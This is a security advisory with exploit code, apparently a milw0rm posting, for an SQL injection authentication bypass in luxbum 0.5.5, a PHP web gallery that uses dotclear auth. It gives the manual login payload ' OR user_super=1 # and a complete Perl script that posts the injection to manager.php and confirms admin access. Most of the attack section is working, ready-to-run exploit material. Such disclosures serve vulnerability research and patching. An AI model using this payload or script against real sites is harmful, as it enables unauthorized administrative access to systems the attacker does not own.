@@ -1,0 +1,121 @@
+ __                                               
+/\ \                                              
+\ \ \/'\     ___    __  _   ___     ___      __   
+ \ \ , <   /' _ `\ /\ \/'\ / __`\ /' _ `\  /'__`\ 
+  \ \ \\`\ /\ \/\ \\/>  <//\ \L\ \/\ \/\ \/\  __/ 
+   \ \_\ \_\ \_\ \_\/\_/\_\ \____/\ \_\ \_\ \____\
+    \/_/\/_/\/_/\/_/\//\/_/\/___/  \/_/\/_/\/____/
+        Better to be alone than in bad company
+
+
+
+
+
++============+
+| MAIN INFOS |
++============+
+
+Software name:	luxbum (PHP Web gallery)
+Version:	0.5.5/stable
+Flaw type:	sql injection -> auth bypass         	
+URL:		http://www.luxbum.net/
+Found by:	knxone <knxone[at]webmail(d0t)ru>
+Greetings:	_Pirata_ from this famous irc server ;)
+
+
+
++=========+
+| CONCEPT |
++=========+
+
+Luxbum allows authentification using dotclear username and password via MySQL,
+while the default auth mechanism uses a md5 hash of the pass in a PHP file.
+
+If you trace all the code from login form to admin panel, you'll notice that
+user input isn't filtered in manager.php or mysql.inc.php. 
+
+So if you use dotclear auth in luxbum, SQL injection is possible but, in order
+to bypass, we need to return at least one row to get it working and it has to
+be a dotclear admin. 
+
+In dotclear, the table dc_user stores in the column "user_super" the super
+admin status. If it's == 1 then the user is super-admin. Since the luxbum auth
+mechanism already fully accesses to dotclear users' data , exploiting is
+very easy and doesn't require the disclosure of dotclear database infos (DB
+name, username, pass, prefix etc.).
+
+
+
++=========+
+| EXPLOIT |
++=========+
+
+- requires magic_quotes = Off
+- requires use of dotclear auth (not default)
+ 
+
+Go to:             http://host/luxbum/manager.php
+Enter as Username: ' OR user_super=1 #
+Enter as Password: xxxxxxxxxxxxxxxxxxxx
+
+
+
++==============+
+| EXPLOIT CODE |
++==============+
+
+#!/usr/bin/perl -w
+# luxbum 0.5.5 auth bypass via sql injection.
+# requires magic_quotes Off and use of dotclear auth
+# returns 0 if successful, else 1
+# ./luxbum http://host.tld/luxbumrootdir
+# By knxone <knxone[at]webmail(d0t)ru>
+use strict;
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Term::ANSIColor qw(:constants);
+$Term::ANSIColor::AUTORESET = 1;
+help() if ( ! defined($ARGV[0]) || scalar(@ARGV) != 1 );
+
+
+my $ua = LWP::UserAgent->new(
+	agent      => 'Mozilla/4.73 [en] (U; Windows 3.1; Internet Explorer 2.0)',
+	cookie_jar => HTTP::Cookies->new(
+		file           => ".cookies",
+		autosave       => 1     	
+	)
+);
+my $url = $ARGV[0]."/manager.php?p=login";
+
+# First we inject to open a valid session
+my $req = HTTP::Request->new( POST => $url ) ;
+$req->content_type("application/x-www-form-urlencoded");
+$req->content("username='+OR+user_super%3D1%23&password=".'x'x32);
+my $response = $ua->request($req);
+if ( ! $response->is_error && $response->content !~ m/message_ko/ ) {
+	print BOLD GREEN "Auth bypass successful :-)\n";
+} else {
+	print BOLD RED "Auth bypass failed :-(\n";
+	exit(1);
+}
+
+
+# Then we check if we've really done it
+$response = $ua->get($ARGV[0]."/manager.php");
+if ( $response->content =~ m/h1_admin/ ) {
+	print BOLD GREEN "Access Granted as gallery Admin at ".$ARGV[0]." :-)))\n";
+	exit(0);
+} else {
+	print BOLD RED "Access Denied at ".$ARGV[0]." :-(\n";
+	exit(1);
+}
+
+
+sub help {
+	print "Usage: ".$0." http://host.tld/luxbumrootdir\n";
+	exit(1);
+}
+
+#EOF
+
+# milw0rm.com [2009-05-08]
